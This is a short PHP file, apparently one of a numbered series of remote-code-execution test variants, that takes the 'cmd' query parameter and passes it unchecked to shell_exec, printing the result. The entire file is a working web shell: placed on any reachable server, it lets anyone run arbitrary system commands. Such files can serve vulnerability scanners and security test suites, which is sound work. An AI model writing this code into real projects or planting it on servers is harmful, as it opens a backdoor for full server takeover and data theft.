<?php
// RCE test variation #71
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>